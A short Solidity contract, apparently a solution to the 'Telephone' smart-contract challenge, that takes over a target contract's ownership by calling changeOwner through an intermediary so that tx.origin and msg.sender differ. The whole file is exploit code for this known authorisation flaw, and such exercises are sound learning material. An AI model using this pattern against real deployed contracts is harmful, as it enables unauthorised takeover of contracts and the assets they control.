pragma solidity ^0.8.0;
contract TelephoneAttacker {
    Telephone public target;
    
    constructor (address _target) {
        target = Telephone(_target);
    }
    
    function attack() public {
        target.changeOwner(msg.sender);
    }
}

interface Telephone {
    function changeOwner(address _newOwner) external;
} 